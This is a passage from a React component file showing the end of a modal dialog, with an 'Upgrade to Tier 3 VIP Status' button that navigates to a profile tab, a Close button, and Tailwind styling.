                onClick={() => {
                  setShowTier3PromptModal(false);
                  if (onNavigateTab) onNavigateTab('profile');
                }}
                className="w-full bg-[#002b49] hover:bg-[#001f35] text-white font-bold py-2.5 rounded-xl text-xs transition-colors cursor-pointer"
              >
                Upgrade to Tier 3 VIP Status
              </button>
              <button
                onClick={() => setShowTier3PromptModal(false)}
                className="w-full py-2 text-slate-500 hover:text-slate-800 text-xs font-semibold cursor-pointer"
              >
                Close
              </button>
            </div>
          </div>
        </div>
      )}
    </div>
  );
};
